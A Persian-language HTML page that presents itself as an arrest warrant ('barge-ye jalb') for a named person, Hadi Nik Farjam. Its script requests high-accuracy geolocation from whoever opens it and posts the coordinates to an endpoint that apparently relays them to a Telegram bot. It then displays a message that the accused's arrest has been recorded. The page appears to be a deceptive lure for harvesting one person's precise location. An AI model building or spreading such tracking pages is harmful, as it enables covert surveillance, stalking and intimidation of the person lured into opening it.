<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>برگه جلب هادی نیک فرجام</title>
  <style>
    body {
      text-align: center;
      font-family: Tahoma, sans-serif;
      padding: 20px;
      background-color: #f4f4f9;
    }
    #status {
      font-size: 16px;
      font-weight: bold;
      color: #333;
      margin-bottom: 15px;
    }
    #jalbImage {
      width: 794px;
      max-width: 100%;
      height: auto;
      border: 2px solid #000;
      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
      margin-top: 10px;
    }
  </style>
</head>
<body>

  <p id="status">⏳ در حال دریافت موقعیت مکانی...</p>

  <img id="jalbImage" src="JALB.jpg" alt="برگ جلب"/>

  <script>
    window.onload = function () {
      const status = document.getElementById('status');

      if (!navigator.geolocation) {
        status.innerText = "❌ مرورگر شما از قابلیت موقعیت‌یابی پشتیبانی نمی‌کند.";
        return;
      }

      const options = {
        enableHighAccuracy: true,
        timeout: 10000,
        maximumAge: 0
      };

      navigator.geolocation.getCurrentPosition(
        async position => {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;

          status.innerText = "⏳ در حال ثبت اطلاعات...";

          try {
            // نکته: اگر مسیر API شما متفاوت است، آدرس زیر را اصلاح کنید
            // برای Next.js مسیر معمولاً '/api/telegram' است
            const response = await fetch('/api/telegram', {
              method: 'POST',
              headers: {
                'Content-Type': 'application/json'
              },
              body: JSON.stringify({
                title: "برگه جلب هادی نیک فرجام",
                latitude: lat,
                longitude: lon
              })
            });

            // بررسی متن پاسخ قبل از پارس کردن به JSON
            const textResponse = await response.text();
            let data;
            
            try {
              data = JSON.parse(textResponse);
            } catch (e) {
              status.innerText = `❌ پاسخ سرور JSON نبود (کد ${response.status}): ${textResponse.slice(0, 100)}`;
              return;
            }

            if (response.ok && data.status === "sent") {
              status.innerText = "✅ جلب متهم هادی نیک فرجام ثبت شد!";
            } else {
              status.innerText = `❌ خطای تلگرام/سرور: ${data.error || data.details || 'نامشخص'}`;
            }

          } catch (error) {
            status.innerText = `❌ خطای شبکه: ${error.message}`;
          }
        },
        error => {
          switch (error.code) {
            case error.PERMISSION_DENIED:
              status.innerText = "❌ اجازه دسترسی به موقعیت مکانی داده نشد.";
              break;
            case error.POSITION_UNAVAILABLE:
              status.innerText = "❌ موقعیت مکانی غیرقابل دسترس است.";
              break;
            case error.TIMEOUT:
              status.innerText = "❌ زمان درخواست موقعیت مکانی به پایان رسید.";
              break;
            default:
              status.innerText = "❌ خطای ناشناخته در دریافت موقعیت.";
          }
        },
        options
      );
    };
  </script>
</body>
</html>
